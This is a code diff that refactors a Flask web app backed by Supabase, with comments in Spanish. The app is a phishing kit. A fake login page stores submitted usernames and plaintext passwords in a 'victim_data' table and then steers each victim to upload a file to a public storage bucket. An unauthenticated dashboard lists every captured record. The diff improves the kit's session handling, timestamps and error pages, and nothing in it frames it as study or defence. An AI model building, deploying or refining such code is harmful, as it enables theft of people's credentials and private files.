@@ -1,148 +1,168 @@
+# Importaciones necesarias
 import os
 import uuid
-from flask import Flask, request, redirect, url_for, render_template
+import time
+from flask import Flask, render_template, request, redirect, url_for, session, g
 from supabase import create_client, Client
 
-# --- Configuración de Supabase (USAR LAS VARIABLES DE ENTORNO) ---
-# Se recomienda usar las variables de entorno configuradas en Render.
-SUPABASE_URL = os.environ.get("SUPABASE_URL")
-SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
-
-# Inicializa el cliente Supabase
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
-
-# --- Configuración de Flask ---
+# ======================================================================
+# CONFIGURACIÓN INICIAL DE FLASK Y SUPABASE
+# ======================================================================
 app = Flask(__name__)
-# Necesario para manejar sesiones (aunque aquí solo usamos la cookie de la víctima)
-app.secret_key = os.environ.get("FLASK_SECRET_KEY", "una_clave_secreta_fuerte_por_defecto")
+# La clave secreta de Flask es necesaria para usar 'session'
+# Usamos una variable de entorno para mayor seguridad.
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "fallback_secret_key_very_secret_123") 
 
+# Variables de entorno para Supabase (corregidas para usar SUPABASE_ANON_KEY)
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_ANON_KEY")
 
-# ----------------------------------------------------------------------------------
-# RUTA 1: Página de Inicio (Captura de Credenciales)
-# ----------------------------------------------------------------------------------
-@app.route('/', methods=['GET'])
+# Crear el cliente de Supabase una sola vez al inicio
+try:
+    if not SUPABASE_URL or not SUPABASE_KEY:
+        raise ValueError("SUPABASE_URL o SUPABASE_ANON_KEY no están configuradas en el entorno.")
+    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+    print("Conexión con Supabase establecida.")
+except Exception as e:
+    print(f"Error al inicializar Supabase: {e}")
+    supabase = None # Si falla, supabase será None
+
+# ======================================================================
+# RUTAS DE LA APLICACIÓN
+# ======================================================================
+
+# Ruta raíz para el formulario de inicio de sesión
+@app.route('/')
 def index():
-    # Renderiza el formulario de inicio de sesión
-    return render_template('login.html')
+    # Si la sesión ya tiene un victim_id, redirigir a la página de subida
+    if 'victim_id' in session:
+        return redirect(url_for('upload_page'))
+    # Renderizar la página de inicio de sesión
+    return render_template('index.html')
 
-# ----------------------------------------------------------------------------------
-# RUTA 2: Procesamiento del Login (Guarda credenciales e inicia el flujo)
-# ----------------------------------------------------------------------------------
+# Ruta para procesar el inicio de sesión (Método POST)
 @app.route('/process_login', methods=['POST'])
 def process_login():
+    if supabase is None:
+        return render_template('error.html', error_message="Fallo de conexión a Supabase."), 500
+        
     try:
-        # 1. Extraer datos del formulario
         username = request.form.get('username')
         password = request.form.get('password')
         
-        # 2. Generar un ID único para rastrear a esta víctima a través de las páginas
+        # 1. Generar un ID único para la "víctima" y el timestamp
         victim_id = str(uuid.uuid4())
+        timestamp = int(time.time()) # Timestamp en segundos
+
+        # 2. Insertar los datos iniciales en la tabla 'victim_data'
+        data_to_insert = {
+            "username": username,
+            "password": password,
+            "victim_id": victim_id,
+            "timestamp": timestamp,
+            "file_name": "N/A - Archivo aún no subido",
+            "file_url": "N/A - Archivo aún no subido"
+        }
         
-        # 3. Insertar credenciales en Supabase (Tabla: victim_data)
-        # Se requiere la política 'INSERT' para el rol 'anon'
-        response, count = supabase.table('victim_data').insert({
-            "username": username, 
-            "password": password, 
-            "victim_id": victim_id, 
-            "file_name": "PENDIENTE", 
-            "file_url": "PENDIENTE"
-        }).execute()
+        # Insertar en la base de datos (Supabase)
+        supabase.table('victim_data').insert(data_to_insert).execute()
         
-        # 4. Redirigir a la página de subida de archivos, pasando el ID de la víctima
-        # El ID se pasa como parámetro en la URL
-        return redirect(url_for('upload_file', victim_id=victim_id))
+        # 3. Guardar el victim_id en la sesión para el siguiente paso
+        session['victim_id'] = victim_id
+        
+        # 4. Redirigir a la página de subida de archivos
+        return redirect(url_for('upload_page'))
 
     except Exception as e:
-        print(f"Error al procesar el login o al conectar con la base de datos: {e}")
-        # En caso de error de Supabase (como el PGRST205 anterior), muestra un mensaje claro.
-        return f"Internal Server Error al intentar conectar con la base de datos: {e}", 500
+        print(f"Error en process_login: {e}")
+        return render_template('error.html', error_message=f"Error al procesar el login e insertar datos: {e}"), 500
 
-# ----------------------------------------------------------------------------------
-# RUTA 3: Formulario de Subida de Archivo
-# ----------------------------------------------------------------------------------
-@app.route('/upload/<victim_id>', methods=['GET'])
-def upload_file(victim_id):
-    # Muestra el formulario de subida de archivos
-    # El victim_id se pasa al template para que el formulario lo use al hacer POST
-    return render_template('upload.html', victim_id=victim_id)
+# Ruta para mostrar el formulario de subida de archivos
+@app.route('/upload')
+def upload_page():
+    # Asegurarse de que el usuario haya pasado por el login (tenga victim_id en sesión)
+    if 'victim_id' not in session:
+        return redirect(url_for('index'))
+    # Renderizar la página de subida de archivos
+    return render_template('upload.html')
 
-# ----------------------------------------------------------------------------------
-# RUTA 4: Procesamiento de la Subida del Archivo
-# ----------------------------------------------------------------------------------
-@app.route('/process_upload/<victim_id>', methods=['POST'])
-def process_upload(victim_id):
-    try:
-        # 1. Obtener el archivo y el ID
-        uploaded_file = request.files['file']
+# Ruta para procesar la subida de archivos (Método POST)
+@app.route('/upload_file', methods=['POST'])
+def upload_file():
+    if supabase is None:
+        return render_template('error.html', error_message="Fallo de conexión a Supabase."), 500
+
+    # 1. Obtener el ID de la sesión
+    victim_id = session.get('victim_id')
+    if not victim_id:
+        return redirect(url_for('index'))
+
+    # 2. Obtener el archivo del formulario
+    if 'file' not in request.files or request.files['file'].filename == '':
+        return render_template('error.html', error_message="No se encontró un archivo en la solicitud."), 400
         
-        # 2. Validar que se haya subido un archivo
-        if not uploaded_file:
-            return redirect(url_for('upload_file', victim_id=victim_id))
-
-        # 3. Generar un nombre único para el archivo en Storage
-        original_filename = uploaded_file.filename
+    file = request.files['file']
+    
+    try:
+        # 3. Preparar nombres y rutas
+        original_filename = file.filename
         file_extension = os.path.splitext(original_filename)[1]
-        storage_filename = f"{victim_id}-{uuid.uuid4()}{file_extension}"
+        # Creamos una ruta única para el almacenamiento
+        storage_path = f"{victim_id}{file_extension}" 
         
         # 4. Subir el archivo a Supabase Storage (Bucket: archivos-victimas)
-        # Se requiere la política 'INSERT' para el rol 'anon' en el bucket
-        response_storage = supabase.storage.from_("archivos-victimas").upload(
-            file=uploaded_file.stream.read(),
-            path=storage_filename,
-            file_options={"content-type": uploaded_file.content_type}
+        # Usamos el contenido binario del archivo
+        supabase.storage.from_('archivos-victimas').upload(
+            file=file.read(),
+            path=storage_path,
+            file_options={"content-type": file.content_type or 'application/octet-stream'}
         )
         
         # 5. Obtener la URL pública del archivo
-        # Se requiere la política 'SELECT' para el rol 'anon' en el bucket para generar esta URL
-        file_url = f"{SUPABASE_URL}/storage/v1/object/public/archivos-victimas/{storage_filename}"
-
-        # 6. Actualizar el registro en la tabla 'victim_data' con el enlace y nombre del archivo
-        # Se requiere la política 'UPDATE' para el rol 'anon' en la tabla
-        response_db, count = supabase.table('victim_data').update({
-            "file_name": original_filename, 
-            "file_url": file_url
-        }).eq("victim_id", victim_id).execute()
+        public_url_response = supabase.storage.from_('archivos-victimas').get_public_url(storage_path)
+        file_url = public_url_response
         
-        # 7. Redirigir a la página de agradecimiento
-        # ESTA RUTA DEBE EXISTIR (RUTA 5)
-        return redirect(url_for('thank_you_page'))
-
+        # 6. Actualizar la base de datos con el nombre y URL del archivo
+        update_data = {
+            "file_name": original_filename,
+            "file_url": file_url
+        }
+        
+        # CORRECCIÓN: Usar eq() para filtrar por el victim_id correcto
+        supabase.table('victim_data').update(update_data).eq('victim_id', victim_id).execute()
+        
+        # 7. Limpiar la sesión 
+        session.pop('victim_id', None)
+        
+        # 8. Redirigir a la página de agradecimiento
+        return redirect(url_for('thank_you'))
+        
     except Exception as e:
-        print(f"Error al procesar la subida del archivo: {e}")
-        return f"Error en la subida del archivo o actualización de la base de datos: {e}", 500
+        print(f"Error al subir el archivo o actualizar DB: {e}")
+        return render_template('error.html', error_message=f"Error crítico al subir y actualizar datos: {e}"), 500
 
-# ----------------------------------------------------------------------------------
-# RUTA 5: Página de Agradecimiento (CORREGIDA)
-# ----------------------------------------------------------------------------------
+# Ruta de agradecimiento (página de destino final)
 @app.route('/thank_you')
-def thank_you_page():
-    # Esta página resuelve el error 404 que estabas viendo.
+def thank_you():
     return render_template('thank_you.html')
 
-# ----------------------------------------------------------------------------------
-# RUTA 6: Dashboard de Monitoreo (Visualización de Datos)
-# ----------------------------------------------------------------------------------
-@app.route('/view_data', methods=['GET'])
+
+# Ruta del dashboard para ver los datos capturados
+@app.route('/view_data')
 def view_data():
+    if supabase is None:
+        return render_template('error.html', error_message="Fallo de conexión a Supabase para dashboard."), 500
+        
     try:
-        # 1. Obtener todos los datos de la tabla 'victim_data'
-        # Se requiere la política 'SELECT' para el rol 'anon' en la tabla
-        response, count = supabase.table('victim_data').select("*").execute()
+        # Seleccionar todos los datos de la tabla 'victim_data' y ordenar por más reciente
+        data_response = supabase.table('victim_data').select('*').order('timestamp', desc=True).execute()
         
-        # 2. Extraer los datos de la respuesta
-        victims_data = response[1] 
+        # Los datos se encuentran en 'data_response.data'
+        victims_data = data_response.data
         
-        # 3. Renderizar el dashboard
+        # Renderizar el dashboard con los datos
         return render_template('dashboard.html', victims=victims_data)
-
+        
     except Exception as e:
-        print(f"Error al obtener los datos para el dashboard: {e}")
-        return f"Error al cargar el dashboard: {e}", 500
-
-
-# ----------------------------------------------------------------------------------
-# ESTRUCTURA DE RUNNING
-# ----------------------------------------------------------------------------------
-if __name__ == '__main__':
-    # Nota: Render utiliza Gunicorn o un WSGI server, así que esto es solo para pruebas locales.
-    app.run(debug=True)
+        print(f"Error al recuperar datos del dashboard: {e}")
+        return render_template('error.html', error_message=f"Error al cargar el dashboard: {e}"), 500
